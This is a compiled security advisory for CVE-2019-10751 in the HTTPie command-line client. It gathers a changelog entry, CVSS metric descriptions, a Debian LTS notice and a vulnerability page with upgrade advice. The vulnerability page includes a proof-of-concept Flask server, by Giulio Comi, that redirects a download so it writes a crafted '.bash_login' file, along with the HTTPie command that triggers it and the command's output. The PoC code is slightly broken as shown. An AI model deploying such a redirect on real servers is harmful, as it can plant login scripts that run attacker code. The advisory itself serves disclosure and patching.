[`747be30`](/httpie/cli/commit/747be30d2efda1b4287a84f1f27f4328621b222c)

Fixed [CVE-2019-10751](https://github.com/advisories/GHSA-xjjg-vmw6-c2p9 "CVE-2019-10751") — the way the output filename is generated for `--download` requests without `--output` resulting in a redirect has been changed to only consider the initial URL as the base for the generated filename, and not the final one. This fixes a potential security issue under the following scenario:

1. A `--download` request with no explicit `--output` is made (e.g., `$ http -d example.org/file.txt`), instructing HTTPie to [generate the output filename](https://httpie.org/doc#downloaded-filename) from the `Content-Disposition` response header, or from the URL if the header is not provided.
2. The server handling the request has been modified by an attacker and instead of the expected response the URL returns a redirect to another URL, e.g., `attacker.example.org/.bash_profile`, whose response does not provide a `Content-Disposition` header (i.e., the base for the generated filename becomes `.bash_profile` instead of `file.txt`).
3. Your current directory doesn’t already contain `.bash_profile` (i.e., no unique suffix is added to the generated filename).
4. You don’t notice the potentially unexpected output filename as reported by HTTPie in the console output (e.g., `Downloading 100.00 B to ".bash_profile"`).

# CVSS v4 base metrics

##### Exploitability Metrics

Attack Vector:
This metric reflects the context by which vulnerability exploitation is possible. This metric value (and consequently the resulting severity) will be larger the more remote (logically, and physically) an attacker can be in order to exploit the vulnerable system. The assumption is that the number of potential attackers for a vulnerability that could be exploited from across a network is larger than the number of potential attackers that could exploit a vulnerability requiring physical access to a device, and therefore warrants a greater severity.

Attack Complexity:
This metric captures measurable actions that must be taken by the attacker to actively evade or circumvent existing built-in security-enhancing conditions in order to obtain a working exploit. These are conditions whose primary purpose is to increase security and/or increase exploit engineering complexity. A vulnerability exploitable without a target-specific variable has a lower complexity than a vulnerability that would require non-trivial customization. This metric is meant to capture security mechanisms utilized by the vulnerable system.

Attack Requirements:
This metric captures the prerequisite deployment and execution conditions or variables of the vulnerable system that enable the attack. These differ from security-enhancing techniques/technologies (ref Attack Complexity) as the primary purpose of these conditions is not to explicitly mitigate attacks, but rather, emerge naturally as a consequence of the deployment and execution of the vulnerable system.

Privileges Required:
This metric describes the level of privileges an attacker must possess prior to successfully exploiting the vulnerability. The method by which the attacker obtains privileged credentials prior to the attack (e.g., free trial accounts), is outside the scope of this metric. Generally, self-service provisioned accounts do not constitute a privilege requirement if the attacker can grant themselves privileges as part of the attack.

User interaction:
This metric captures the requirement for a human user, other than the attacker, to participate in the successful compromise of the vulnerable system. This metric determines whether the vulnerability can be exploited solely at the will of the attacker, or whether a separate user (or user-initiated process) must participate in some manner.
##### Vulnerable System Impact Metrics

Confidentiality:
This metric measures the impact to the confidentiality of the information managed by the VULNERABLE SYSTEM due to a successfully exploited vulnerability. Confidentiality refers to limiting information access and disclosure to only authorized users, as well as preventing access by, or disclosure to, unauthorized ones.

Integrity:
This metric measures the impact to integrity of a successfully exploited vulnerability. Integrity refers to the trustworthiness and veracity of information. Integrity of the VULNERABLE SYSTEM is impacted when an attacker makes unauthorized modification of system data. Integrity is also impacted when a system user can repudiate critical actions taken in the context of the system (e.g. due to insufficient logging).

Availability:
This metric measures the impact to the availability of the VULNERABLE SYSTEM resulting from a successfully exploited vulnerability. While the Confidentiality and Integrity impact metrics apply to the loss of confidentiality or integrity of data (e.g., information, files) used by the system, this metric refers to the loss of availability of the impacted system itself, such as a networked service (e.g., web, database, email). Since availability refers to the accessibility of information resources, attacks that consume network bandwidth, processor cycles, or disk space all impact the availability of a system.
##### Subsequent System Impact Metrics

Confidentiality:
This metric measures the impact to the confidentiality of the information managed by the SUBSEQUENT SYSTEM due to a successfully exploited vulnerability. Confidentiality refers to limiting information access and disclosure to only authorized users, as well as preventing access by, or disclosure to, unauthorized ones.

Integrity:
This metric measures the impact to integrity of a successfully exploited vulnerability. Integrity refers to the trustworthiness and veracity of information. Integrity of the SUBSEQUENT SYSTEM is impacted when an attacker makes unauthorized modification of system data. Integrity is also impacted when a system user can repudiate critical actions taken in the context of the system (e.g. due to insufficient logging).

Availability:
This metric measures the impact to the availability of the SUBSEQUENT SYSTEM resulting from a successfully exploited vulnerability. While the Confidentiality and Integrity impact metrics apply to the loss of confidentiality or integrity of data (e.g., information, files) used by the system, this metric refers to the loss of availability of the impacted system itself, such as a networked service (e.g., web, database, email). Since availability refers to the accessibility of information resources, attacks that consume network bandwidth, processor cycles, or disk space all impact the availability of a system.

Package        : httpie
Version        : 0.8.0-1+deb8u1
CVE ID         : CVE-2019-10751
Debian Bug     : 940058

An open redirect, that allows an attacker to write an arbitrary file with
supplied filename and content to the current directory, by redirecting a
request from HTTP to a crafted URL pointing to a server in his or hers control,
was found and reported in CVE-2019-10751.
This was patched upstream and so when `--download` without `--output` results
in a redirect, now only the initial URL is considered, not the final one.

For Debian 8 "Jessie", this problem has been fixed in version
0.8.0-1+deb8u1.

We recommend that you upgrade your httpie packages.

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://wiki.debian.org/LTS>

#### Introduced: 24 Jun 2019

[CVE-2019-10751  (opens in a new tab)](https://www.cve.org/CVERecord?id=CVE-2019-10751) Common Vulnerabilities and Exposures (CVE) are common identifiers for publicly known security vulnerabilities[CWE-601  (opens in a new tab)](https://cwe.mitre.org/data/definitions/601.html) Common Weakness Enumeration (CWE) is a category system for software weaknesses First added by Snyk
## How to fix?

Upgrade `httpie` to version 1.0.3 or higher.

## Overview

[httpie](https://github.com/jakubroztocil/httpie) is a command line HTTP client.

Affected versions of this package are vulnerable to Open Redirect that allows an attacker to write an arbitrary file with supplied filename and content to the current directory, by redirecting a request from HTTP to a crafted URL pointing to a server in his or hers control.
Depending on the context of using this command, this can lead to remote code execution and possibly privilege escalation.

## PoC by Giulio Comi

First, we need to setup the attacking server with the redirection. In python, `Flask` can be used for this matter:

```
from flask import Flask, send_from_directory, redirect
app = Flask(__name__)

@app.route('/')
def hello_world():
    return 'Hello World!'

@app.route('/original_filename', methods=['GET'])
def hello():
    return redirect("<http://localhost:5000/static/.bash_login>", code=302)

@app.route('/static/<path:path>', methods=['GET'])
def malicious():
    response = make_response(send_from_directory('static', path))
    response.headers['Content-Type'] = 'application/json'
    response.headers['Content-Disposition'] = 'inline'
    return response

if name == 'main':
    app.run(host='0.0.0.0', port=5000)

```

Running `HTTPie` with attempting to download from the server will result in:

```
root@host: /# http --proxy http://127.0.0.1:8080 --download http://localhost:5000/original_filename
HTTP/1.0 200 OK
Accept-Ranges: bytes
Cache-Control: public, max-age=43200
Content-Length: 7
Content-type: application/octet-stream
Date: Thu, 23 May 2019 20:20:52 GMT
Last-Modified: Thu, 23 May 2019 19:54:21 GMT
Server: Werkzeug/0.15.4 Python/2.7.13

Downloading 50.00 B to ".bash_login"
Done. 50.00 B in 0.00050s (96.97 kB/s)

```

The controlled server then redirects the GET request for `original_filename` to a malicious crafted `.bash_login` file.
Running this command in the home directory might create the previously non-existing `.bash_login` that can lead to code execution when the user logs in.

## Mitigations

From the `HTTPie` official documentation:

```
If not provided via --output, -o, the output filename will be determined from Content-Disposition (if available), or from the URL and Content-Type. If the guessed filename already exists, HTTPie adds a unique suffix to it.

```

Thus, `HTTPie` will add a suffix to any existing file if not provided otherwise preventing critical file overwrites.

### CVSS Scores

version 3.1
### Snyk

8.8 high

* Attack Vector (AV)

  The vulnerable component is bound to the network stack and the set of possible attackers extends beyond the other options listed below, up to and including the entire Internet. Such a vulnerability is often termed “remotely exploitable” and can be thought of as an attack being exploitable *at the protocol level* one or more network hops away (e.g., across one or more routers).

  **Network**
* Attack Complexity (AC)

  Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success when attacking the vulnerable component.

  **Low**
* Privileges Required (PR)

  The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the vulnerable system to carry out an attack.

  **None**
* User Interaction (UI)

  Successful exploitation of this vulnerability requires a user to take some action before the vulnerability can be exploited. For example, a successful exploit may only be possible during the installation of an application by a system administrator.

  **Required**

* Scope (S)

  An exploited vulnerability can only affect resources managed by the same security authority. In this case, the vulnerable component and the impacted component are either the same, or both are managed by the same security authority.

  **Unchanged**

* Confidentiality (C)

  There is a total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact. For example, an attacker steals the administrator's password, or private encryption keys of a web server.

  **High**
* Integrity (I)

  There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component. Alternatively, only some files can be modified, but malicious modification would present a direct, serious consequence to the impacted component.

  **High**
* Availability (A)

  There is a total loss of availability, resulting in the attacker being able to fully deny access to resources in the impacted component; this loss is either sustained (while the attacker continues to deliver the attack) or persistent (the condition persists even after the attack has completed). Alternatively, the attacker has the ability to deny some availability, but the loss of availability presents a direct, serious consequence to the impacted component (e.g., the attacker cannot disrupt existing connections, but can prevent new connections; the attacker can repeatedly exploit a vulnerability that, in each instance of a successful attack, leaks a only small amount of memory, but after repeated exploitation causes a service to become completely unavailable).

  **High**
